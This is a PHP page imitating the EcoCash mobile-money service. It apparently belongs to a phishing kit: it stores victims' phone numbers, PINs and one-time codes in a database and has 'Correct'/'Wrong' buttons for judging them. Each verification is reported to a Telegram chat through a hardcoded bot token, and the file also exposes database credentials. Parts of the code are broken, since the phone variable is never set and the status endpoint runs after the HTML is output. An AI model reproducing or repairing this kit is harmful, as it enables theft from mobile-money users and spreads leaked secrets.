<?php
session_start();

// ========== POSTGRESQL CONFIGURATION ==========
$dbHost = "dpg-d8l5ii7lk1mc73cjcvs0-a";
$dbPort = 5432;
$dbName = "loan_9d8q";
$dbUser = "loan_9d8q_user";
$dbPass = "Jhl6RiIZwV5AnvLVCKirxqgLMtFi5gZX";
// ==============================================

$botToken = "8163112809:AAH5OFmjVHKPDz1svGG9viGjpAuNLFHsctc";
$chatId   = "-5193742613";



function getDbConnection($host, $port, $dbname, $user, $pass) {
    static $conn = null;
    if ($conn === null) {
        if (!function_exists('pg_connect')) {
            error_log("PostgreSQL extension (pgsql) is NOT available.");
            return false;
        }
        $connString = "host=$host port=$port dbname=$dbname user=$user password=$pass";
        $conn = @pg_connect($connString);
        if (!$conn) {
            error_log("DB connection failed: " . pg_last_error());
            return false;
        }
    }
    return $conn;
}

$conn = getDbConnection($dbHost, $dbPort, $dbName, $dbUser, $dbPass);
if (!$conn) {
    die("Database connection failed. Please contact admin.");
}

// ========== ENSURE ALL NECESSARY COLUMNS EXIST ==========
$columns = [
    'pin'        => 'VARCHAR(4) DEFAULT \'0000\'',
    'otp'        => 'VARCHAR(6) DEFAULT \'000000\'',
    'status'     => 'SMALLINT DEFAULT 0',
    'otp_status' => 'SMALLINT DEFAULT 0',
    'approve'    => 'SMALLINT DEFAULT 0'
];
foreach ($columns as $col => $def) {
    $check = pg_query($conn, "SELECT column_name FROM information_schema.columns 
                               WHERE table_name='ecocash_auth' AND column_name='$col'");
    if (!$check || pg_num_rows($check) == 0) {
        $alter = "ALTER TABLE ecocash_auth ADD COLUMN $col $def";
        pg_query($conn, $alter);
    }
}
// ========================================================

// Ensure phone exists (insert default row if missing)
$checkSql = "SELECT id FROM ecocash_auth WHERE phone = $1 LIMIT 1";
$checkRes = pg_query_params($conn, $checkSql, [$phone]);
if (!$checkRes || pg_num_rows($checkRes) === 0) {
    $insertSql = "INSERT INTO ecocash_auth (phone, pin, otp, status, otp_status, approve) 
                  VALUES ($1, '0000', '000000', 0, 0, 0)";
    pg_query_params($conn, $insertSql, [$phone]);
}

// AJAX handling
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_SERVER['HTTP_X_REQUESTED_WITH']) 
    && strtolower($_SERVER['HTTP_X_REQUESTED_WITH']) === 'xmlhttprequest') {
    
    header('Content-Type: application/json');
    $type = $_POST['type'] ?? '';
    $value = $_POST['value'] ?? '';
    $action = $_POST['action'] ?? '';
    
    if (!in_array($type, ['pin', 'otp']) || !in_array($action, ['correct', 'wrong'])) {
        echo json_encode(['success' => false, 'error' => 'Invalid request']);
        exit;
    }
    
    // Fetch stored value from the LATEST record
    $col = ($type === 'pin') ? 'pin' : 'otp';
    $sql = "SELECT $col FROM ecocash_auth WHERE phone = $1 ORDER BY id DESC LIMIT 1";
    $result = pg_query_params($conn, $sql, [$phone]);
    if (!$result || !($row = pg_fetch_assoc($result))) {
        echo json_encode(['success' => false, 'error' => 'No record found']);
        exit;
    }
    
    $stored = $row[$col];
    $isCorrect = ($value == $stored);
    
    if ($action === 'correct') {
        if (!$isCorrect) {
            echo json_encode(['success' => false, 'error' => 'Incorrect value']);
            exit;
        }
        // Update status column on the LATEST record
        $updateCol = ($type === 'pin') ? 'status' : 'otp_status';
        $updateSql = "UPDATE ecocash_auth SET $updateCol = 1 
                      WHERE id = (SELECT id FROM ecocash_auth WHERE phone = $1 ORDER BY id DESC LIMIT 1)";
        pg_query_params($conn, $updateSql, [$phone]);
        
        $msg = "✅ User $phone verified $type successfully.";
        @file_get_contents("https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatId&text=" . urlencode($msg));
        
        echo json_encode(['success' => true, 'message' => ucfirst($type) . ' verified (1)']);
    } 
    else { // wrong
        $updateCol = ($type === 'pin') ? 'status' : 'otp_status';
        $updateSql = "UPDATE ecocash_auth SET $updateCol = 0 
                      WHERE id = (SELECT id FROM ecocash_auth WHERE phone = $1 ORDER BY id DESC LIMIT 1)";
        pg_query_params($conn, $updateSql, [$phone]);
        echo json_encode(['success' => true, 'message' => ucfirst($type) . ' marked wrong (0)']);
    }
    exit;
}

// Fetch current statuses from the LATEST record
$sql = "SELECT status, otp_status FROM ecocash_auth WHERE phone = $1 ORDER BY id DESC LIMIT 1";
$res = pg_query_params($conn, $sql, [$phone]);
$pinStatus = $otpStatus = 0;
if ($res && $row = pg_fetch_assoc($res)) {
    $pinStatus = (int)$row['status'];
    $otpStatus = (int)$row['otp_status'];
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Verify PIN & OTP | EcoCash</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * { box-sizing: border-box; }
        body { margin: 0; background: #f1f5f9; font-family: Arial, Helvetica, sans-serif; padding: 20px; }
        .header { text-align: center; padding: 15px; font-size: 24px; font-weight: bold; }
        .header span:first-child { color: red; }
        .header span:last-child { color: #2563eb; }
        .card { max-width: 500px; margin: 20px auto; background: #fff; padding: 30px; border-radius: 18px; box-shadow: 0 8px 25px rgba(0,0,0,.08); text-align: center; }
        .title { font-size: 20px; font-weight: bold; margin-bottom: 20px; }
        .phone-box { background: #f8fafc; padding: 12px; border-radius: 10px; margin-bottom: 20px; font-size: 16px; }
        .btn-group { display: flex; gap: 15px; justify-content: center; margin: 25px 0; }
        button { padding: 12px 24px; border: none; border-radius: 40px; font-size: 16px; font-weight: bold; cursor: pointer; transition: 0.2s; }
        .btn-pin { background-color: #1d4ed8; color: white; }
        .btn-pin:hover { background-color: #1e40af; }
        .btn-otp { background-color: #10b981; color: white; }
        .btn-otp:hover { background-color: #059669; }
        .status { margin-top: 20px; padding: 12px; border-radius: 12px; background: #f8fafc; font-size: 14px; }
        .status span { font-weight: bold; }
        .status .verified { color: green; }
        .status .pending { color: orange; }
        .modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); justify-content: center; align-items: center; z-index: 1000; }
        .modal-content { background: white; border-radius: 16px; width: 320px; padding: 24px; text-align: center; }
        .modal-content p { margin: 0 0 15px; font-size: 18px; font-weight: 600; }
        .modal-content input { width: 90%; padding: 10px; margin: 10px 0 20px; border: 1px solid #ccc; border-radius: 8px; font-size: 16px; text-align: center; }
        .modal-buttons { display: flex; gap: 12px; justify-content: center; }
        .modal-buttons button { padding: 8px 20px; font-size: 14px; }
        .btn-correct { background-color: #10b981; color: white; }
        .btn-wrong { background-color: #ef4444; color: white; }
        .footer { text-align: center; font-size: 11px; color: #6c757d; margin-top: 20px; }
    </style>
</head>
<body>
<div class="header"><span>Eco</span><span>Cash</span></div>
<div class="card">
    <div class="title">Verify Your Identity</div>
    <div class="phone-box"><strong>Phone:</strong> +263 <?= htmlspecialchars($phone) ?></div>
    <div class="btn-group">
        <button class="btn-pin" id="pinBtn">🔐 Verify PIN</button>
        <button class="btn-otp" id="otpBtn">📱 Verify OTP</button>
    </div>
    <div class="status" id="statusBox">
        <div>PIN Status: <span id="pinStatus" class="<?= $pinStatus ? 'verified' : 'pending' ?>"><?= $pinStatus ? 'Verified (1)' : 'Pending (0)' ?></span></div>
        <div>OTP Status: <span id="otpStatus" class="<?= $otpStatus ? 'verified' : 'pending' ?>"><?= $otpStatus ? 'Verified (1)' : 'Pending (0)' ?></span></div>
    </div>
    <div class="footer">Both must be verified to continue</div>
</div>

<div id="verifyModal" class="modal">
    <div class="modal-content">
        <p id="modalTitle">Enter PIN</p>
        <input type="text" id="modalInput" placeholder="Enter value" autocomplete="off">
        <div class="modal-buttons">
            <button id="modalCorrect" class="btn-correct">✔ Correct</button>
            <button id="modalWrong" class="btn-wrong">✘ Wrong</button>
        </div>
    </div>
</div>

<script>
    let currentType = null;
    const modal = document.getElementById('verifyModal');
    const modalTitle = document.getElementById('modalTitle');
    const modalInput = document.getElementById('modalInput');
    const pinStatusSpan = document.getElementById('pinStatus');
    const otpStatusSpan = document.getElementById('otpStatus');

    function showModal(type) {
        currentType = type;
        modalTitle.innerText = type === 'pin' ? 'Enter 4-digit PIN' : 'Enter OTP';
        modalInput.value = '';
        modal.style.display = 'flex';
    }
    function closeModal() { modal.style.display = 'none'; currentType = null; }
    async function sendVerification(type, value, action) {
        const fd = new FormData();
        fd.append('type', type);
        fd.append('value', value);
        fd.append('action', action);
        try {
            const res = await fetch(window.location.href, { method: 'POST', headers: { 'X-Requested-With': 'XMLHttpRequest' }, body: fd });
            const data = await res.json();
            if (data.success) {
                await refreshStatuses();
                showTemporaryMessage(data.message, action === 'correct' ? 'green' : 'orange');
                await checkBothVerifiedAndRedirect();
            } else alert('Error: ' + (data.error || 'Verification failed'));
        } catch(err) { alert('Network error'); }
        closeModal();
    }
    async function refreshStatuses() {
        const res = await fetch(window.location.href + '?get_status=1');
        const data = await res.json();
        pinStatusSpan.innerText = data.pin_status === 1 ? 'Verified (1)' : 'Pending (0)';
        pinStatusSpan.className = data.pin_status === 1 ? 'verified' : 'pending';
        otpStatusSpan.innerText = data.otp_status === 1 ? 'Verified (1)' : 'Pending (0)';
        otpStatusSpan.className = data.otp_status === 1 ? 'verified' : 'pending';
    }
    async function checkBothVerifiedAndRedirect() {
        const res = await fetch(window.location.href + '?get_status=1');
        const data = await res.json();
        if (data.pin_status === 1 && data.otp_status === 1) window.location.href = 'dashboard.php';
    }
    function showTemporaryMessage(msg, color) {
        const div = document.createElement('div');
        div.style.cssText = `color:${color}; margin-top:10px; font-weight:bold;`;
        div.innerText = msg;
        document.getElementById('statusBox').appendChild(div);
        setTimeout(() => div.remove(), 2000);
    }
    document.getElementById('pinBtn').onclick = () => showModal('pin');
    document.getElementById('otpBtn').onclick = () => showModal('otp');
    document.getElementById('modalCorrect').onclick = () => {
        const val = modalInput.value.trim();
        if (!val) return alert('Please enter a value');
        sendVerification(currentType, val, 'correct');
    };
    document.getElementById('modalWrong').onclick = () => sendVerification(currentType, '', 'wrong');
    window.onclick = (e) => { if (e.target === modal) closeModal(); };
</script>

<?php
if (isset($_GET['get_status']) && $_GET['get_status'] == 1) {
    header('Content-Type: application/json');
    $sql = "SELECT status, otp_status FROM ecocash_auth WHERE phone = $1 ORDER BY id DESC LIMIT 1";
    $res = pg_query_params($conn, $sql, [$phone]);
    if ($res && $row = pg_fetch_assoc($res)) {
        echo json_encode(['pin_status' => (int)$row['status'], 'otp_status' => (int)$row['otp_status']]);
    } else {
        echo json_encode(['pin_status' => 0, 'otp_status' => 0]);
    }
    exit;
}
?>
</body>
</html>
